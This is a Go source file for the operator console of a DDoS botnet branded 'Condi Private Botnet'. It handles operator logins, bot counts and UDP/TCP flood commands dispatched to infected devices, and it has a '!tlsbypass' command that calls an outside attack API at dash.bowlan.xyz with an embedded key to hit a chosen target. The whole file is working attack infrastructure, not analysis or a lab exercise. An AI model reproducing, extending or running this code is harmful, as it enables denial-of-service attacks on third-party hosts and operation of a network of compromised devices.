package main

import (
    "fmt"
    "net"
    "time"
    "strings"
    "strconv"
    "crypto/md5"
    "encoding/hex"
    "net/http"
)

type Admin struct {
    conn    net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
    return &Admin{conn}
}

func (this *Admin) encryptIP(ip string, salt string) string {
    ipSalt := ip + salt
    ipBytes := net.ParseIP(ipSalt).To4()
    hash := md5.Sum(ipBytes)
    return hex.EncodeToString(hash[:])
}

func (this *Admin) getIP() string {
    addr := this.conn.RemoteAddr().String()
    ip, _, err := net.SplitHostPort(addr)
    if err != nil {
        fmt.Println("Error getting IP address:", err)
        return ""
    }
    return ip
}

func (this *Admin) tlsBypass(target string, port string, duration int) {
    url := fmt.Sprintf("https://dash.bowlan.xyz/api/api.php?key=34!B7ooynDe6amB&host=%s&port=%s&time=%d&method=TLS-BYPASS", target, port, duration)
    
    resp, err := http.Get(url)
    if err != nil {
        this.conn.Write([]byte("attack sent error.\r\n"))
    }
    defer resp.Body.Close()
    
    this.conn.Write([]byte("attack sent successfully.\r\n"))
}

func (this *Admin) Handle() {
    defer func() {
        this.conn.Write([]byte("\033[?1049l"))
    }()

    // Get username
    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\033[2J\033[1;1H\033[1;37m"))
    this.conn.Write([]byte("username: "))
    username, err := this.ReadLine(false)
    if err != nil {
        return
    }

    // Get password
    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("password: "))
    password, err := this.ReadLine(true)
    if err != nil {
        return
    }

    this.conn.SetDeadline(time.Now().Add(120 * time.Second))
    this.conn.Write([]byte("\r\n"))
    this.conn.Write([]byte(""+ this.conn.RemoteAddr().String() +"."))

    for i := 0; i < 3; i++ {
        this.conn.Write([]byte("."))
        time.Sleep(time.Duration(60) * time.Millisecond)
    }

    var loggedIn bool
    var userInfo AccountInfo
    if loggedIn, userInfo = database.TryLogin(username, password); !loggedIn {
        return
    }

    // anti crashed lol
    this.conn.Write([]byte("\r\n"))
    this.conn.Write([]byte("\033[2J\033[1;1H\033[1;37m"))
    time.Sleep(1 * time.Second)

var udpFloodCount int
var tcpFloodCount int

go func() {
    startTime := time.Now()
    i := 0
    for {
        var BotCount int
        if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
            BotCount = userInfo.maxBots
        } else {
            BotCount = clientList.Count()
        }

        time.Sleep(time.Second)

        salt := "condibotnet2023"
        saltedUsername := salt + username
        hashed := md5.Sum([]byte(saltedUsername))
        hashedStr := hex.EncodeToString(hashed[:])
        uptime := time.Since(startTime).Round(time.Second)

        if udpFloodCount < 1 && tcpFloodCount < 1 {
            if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0;%d Bots | %s Uptime | %s\007", BotCount, uptime, hashedStr))); err != nil {
                this.conn.Close()
                break
            }
        } else {
            if udpFloodCount > 0 {
                udpFloodCount--
            }
            if tcpFloodCount > 0 {
                tcpFloodCount--
            }
        }

        i++
        if i % 60 == 0 {
            this.conn.SetDeadline(time.Now().Add(120 * time.Second))
        }
    }
}()

    for {
        var botCatagory string
        var botCount int
        salt := "condibotnet2023"
        saltedUsername := salt + username
        hashed := md5.Sum([]byte(saltedUsername))
        hashedStr := hex.EncodeToString(hashed[:])
        this.conn.Write([]byte("" + hashedStr + "@botnet# "))
        cmd, err := this.ReadLine(false)

        if err != nil || cmd == "?" || cmd == "methods" || cmd == "help" {
            this.conn.Write([]byte("\r\n - udpflood   | simple udp flood (raw)\r\n"))
            this.conn.Write([]byte(" - tcpflood   | simple tcp flood (raw)\r\n\r\n"))
            this.conn.Write([]byte("How to use: ![method] [target] [port] [duration] [options]\r\n\r\n"))
            continue
        }

        if err != nil || cmd == "info" {
            this.conn.Write([]byte("Condi Private Botnet\r\n"))
            this.conn.Write([]byte("- Privacy connection with MD5 encrypt.\r\n"))
            this.conn.Write([]byte("- Better killer kill all shit net.\r\n"))
            this.conn.Write([]byte("- Simple API url attack.\r\n\r\n"))
            this.conn.Write([]byte(fmt.Sprintf("- Total attacks: %d\r\n", database.totalAttacks())))
            this.conn.Write([]byte(fmt.Sprintf("- Total users: %d\r\n", database.totalUsers())))
            continue
        }

        if err != nil || cmd == "exit" || cmd == "quit" {
            return
        }

        if cmd == "" {
            continue
        }

        var ips []string
        if cmd == "online" {
            ip := this.getIP()
            ips = append(ips, ip)
            ipList := "Online:\n"
            for _, ip := range ips {
                md5IP := this.encryptIP(ip, salt)
                ipList += md5IP + " (encrypt)\n"
            }
            msg := []byte(ipList)
            this.conn.Write(msg)
            continue
        }

        if cmd == "cls" || cmd == "clear" {
            this.conn.Write([]byte("\033[2J\033[1;1H\033[1;37m"))
            continue
        }

        cmdParts := strings.Split(cmd, " ")
        if cmdParts[0] == "!tlsbypass" && len(cmdParts) == 4 {
            target := cmdParts[1]
            port := cmdParts[2]
            durationStr := cmdParts[3]

            duration, err := strconv.Atoi(durationStr)
            if err != nil {
                fmt.Println("Error:", err)
                continue
            }

            this.tlsBypass(target, port, duration)
            continue
        }

        botCount = userInfo.maxBots

        if cmd == "bots" || cmd == "count" {
            m := clientList.Distribution()
            for k, v := range m {
                this.conn.Write([]byte(fmt.Sprintf("[%s] %d\r\n", k, v)))
            }
            continue
        }

        if cmd[0] == '-' {
            countSplit := strings.SplitN(cmd, " ", 2)
            count := countSplit[0][1:]
            botCount, err = strconv.Atoi(count)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("Failed to parse botcount \"%s\"\r\n", count)))
                continue
            }
            if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
                this.conn.Write([]byte(fmt.Sprintf("Bot count to send is bigger then allowed bot maximum\r\n")))
                continue
            }
            cmd = countSplit[1]
        }
        if userInfo.admin == 1 && cmd[0] == '@' {
            cataSplit := strings.SplitN(cmd, " ", 2)
            botCatagory = cataSplit[0][1:]
            cmd = cataSplit[1]
        }

        atk, err := NewAttack(cmd, userInfo.admin)
        if err != nil {
            this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
        } else {
            buf, err := atk.Build()
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
            } else {
                if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
                    this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
                } else if !database.ContainsWhitelistedTargets(atk) {
                    clientList.QueueBuf(buf, botCount, botCatagory)
                    var AttackCount int
                    if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
                        AttackCount = userInfo.maxBots
                    } else {
                        AttackCount = clientList.Count()
                    }
                    this.conn.Write([]byte(fmt.Sprintf("attack sent successfully to %d devices.\r\n", AttackCount)))
                } else {
                    fmt.Println("Blocked attack by " + username + " to whitelisted prefix")
                }
            }
        }
    }
}

func (this *Admin) ReadLine(masked bool) (string, error) {
    buf := make([]byte, 1024)
    bufPos := 0

    for {
        n, err := this.conn.Read(buf[bufPos:bufPos+1])
        if err != nil || n != 1 {
            return "", err
        }
        if buf[bufPos] == '\xFF' {
            n, err := this.conn.Read(buf[bufPos:bufPos+2])
            if err != nil || n != 2 {
                return "", err
            }
            bufPos--
        } else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
            if bufPos > 0 {
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos--
            }
            bufPos--
        } else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
            bufPos--
        } else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
            //this.conn.Write([]byte("\r\n"))
            return string(buf[:bufPos]), nil
        } else if buf[bufPos] == 0x03 {
            this.conn.Write([]byte("^C\r\n"))
            return "", nil
        } else {
            if buf[bufPos] == '\x1B' {
                buf[bufPos] = '^';
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos++;
                buf[bufPos] = '[';
                this.conn.Write([]byte(string(buf[bufPos])))
            } else if masked {
                //this.conn.Write([]byte("*"))
            } else {
                //this.conn.Write([]byte(string(buf[bufPos])))
            }
        }
        bufPos++
    }
    return string(buf), nil
}
